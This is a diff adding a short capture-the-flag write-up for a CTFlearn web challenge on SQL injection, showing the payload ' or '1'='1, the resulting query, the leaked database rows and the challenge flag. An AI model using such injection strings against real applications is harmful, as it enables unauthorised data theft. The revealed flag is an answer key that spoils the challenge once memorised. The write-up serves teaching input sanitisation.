@@ -1,0 +1,47 @@
+Name: Basic Injection	
+-------------------
+Created: Mar 25th 17
+Points: 30
+Category: Web
+Difficulty: Easy
+Author: intelagent	
+
+Description: 	
+See if you can leak the whole database. The flag is in there somwhere… https://web.ctflearn.com/web4/
+---------------------------------------------------------------------------------
+Process:
+When we open the above stated page, we can see it's a simple website with text box and submit button. If we inspect the HTML code with F12, in the code we can see some names. We try Luke. That shows us that this database contains the names and corresponding data.
+If you ever tried sql injection, this is the time to repeat it.
+You could try entering something that the creator "didn't expect you to do" like:
+' or '1'='1 
+which might look like this in the code
+SELECT * FROM users WHERE name = '' OR '1'='1';
+
+you might guessed by now what does it do if u have some programming experience
+the output of the website is like this:
+
+Name: Luke
+Data: I made this problem.
+Name: Alec
+Data: Steam boys.
+Name: Jalen
+Data: Pump that iron fool.
+Name: Eric
+Data: I make cars.
+Name: Sam
+Data: Thinks he knows SQL.
+Name: fl4g__giv3r
+Data: th4t_is_why_you_n33d_to_sanitiz3_inputs
+Name: snoutpop
+Data: jowls
+Name: Chunbucket
+Data: @datboiiii
+
+
+so what in the world could be the flag? do out think that fl4g__giv3r might be the cue?
+==================================================================================
+
+he is
+th4t_is_why_you_n33d_to_sanitiz3_inputs
+
+and that's it
